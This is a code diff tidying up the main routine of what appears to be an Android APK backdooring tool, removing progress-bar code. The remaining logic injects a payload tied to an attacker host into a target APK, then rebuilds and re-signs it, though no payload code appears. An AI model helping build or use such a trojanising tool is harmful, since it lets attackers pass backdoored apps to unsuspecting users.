@@ -3,7 +3,6 @@ import argparse
 import logging
 import re
 from collections import namedtuple
-import progressbar
 from colorama import Fore, Style
 
 from . import __version__
@@ -84,41 +83,33 @@ def setup_args():
 
 
 def main():
-    # widgets = [
-    #     Fore.YELLOW, ' [', progressbar.Timer(), '] ',
-    #     progressbar.Bar(), Style.RESET_ALL
-    # ]
-
     utilities.clear_screen()
     print(Fore.RED + utilities.get_title(center=True) + Style.RESET_ALL)
 
     args = setup_args()
     logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log')
 
-    # progress = progressbar.ProgressBar(max_value=6, widgets=widgets, redirect_stdout=True)
-    # progress.update(0)
 
     payload = Payload(args.host, args.public_host)
-    # progress.update(1)
 
     apk = Apk(args.apk)
     
     print('[ ==== PAYLOAD INJECTION ==== ]'.center(120))
     payload.inject(apk)
-    # progress.update(2)
     payload.delete()
+
     print('[ ==== TARGET FINALIZATION ==== ]'.center(120))
-    # progress.update(3)
+
     print_phase("Building modified target's APK")
     apk.build()
     phase_done()
-    # progress.update(4)
+
     print_phase("Signing modified target's APK")
     apk.sign()
     phase_done()
-    # progress.update(5)
+
     print_phase("Removing target's APK decompilation's results")
     apk.remove_decompiled()
     phase_done()
-    # progress.finish(6)
+
     print()
